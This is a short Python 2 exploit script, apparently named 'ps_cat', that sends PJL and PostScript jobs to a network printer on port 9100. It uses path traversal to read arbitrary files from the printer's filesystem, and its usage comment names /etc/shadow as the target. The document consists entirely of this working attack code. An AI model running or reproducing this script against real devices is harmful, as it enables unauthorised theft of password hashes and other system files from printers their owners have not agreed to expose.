#!/usr/bin/python

#usage:
#./ps_cat <IP of Printer> <file to cat>
#./ps_cat 1.1.1.1 /etc/shadow


import socket
import sys

HOST = '1.1.1.16' 
PORT = 9100

#GETFILE = '/etc/passwd'
HOSTIP = sys.argv[1]
GETFILE = sys.argv[2]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOSTIP, PORT))
DATA = '1b'.decode("hex") + '%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT\n%!\n/print {(%stdout) (w) file dup 3 2 roll writestring flushfile} def\n/== {128 string cvs print (\\' + '6e'.decode("hex") + ') print} def\n{(x1) = (x2) == << /DoPrintErrors false >> setsystemparams} stopped\n(DELIMITER6704\\' + '6e'.decode("hex") + ') print flush\n'
DATA2 = '1b'.decode("hex") + '%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT\n%!\nproduct print\n(DELIMITER3344\\' + '6e'.decode("hex") + ') print flush\n'
DATA3 = '1b'.decode("hex") + '%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT\n%!\n(../../../..' + GETFILE + ') status dup {pop == == == ==} if\n(DELIMITER3344\\' + '6e'.decode("hex") + ') print flush\n'
DATA4 = '1b'.decode("hex") + '%-12345X@PJL ENTER LANGUAGE = POSTSCRIPT\n%!\n/byte (0) def\n/infile (../../../..' + GETFILE +') (r) file def\n{infile read {byte exch 0 exch put\n(%stdout) (w) file byte writestring}\n{infile closefile exit} ifelse\n} loop\n(DELIMITER39526\\' + '6e'.decode("hex") + ') print flush\n'

s.send(DATA)
data = s.recv(8192)
dataa = s.recv(8192)

s.send(DATA2)
data2 = s.recv(4096)

s.send(DATA3)
data3 = s.recv(4096)
data3a = s.recv(8192)

s.send(DATA4)
data4 = ""
while "DELIMITER" not in data4:
   data4 = s.recv(16384)
   print data4,


s.close()


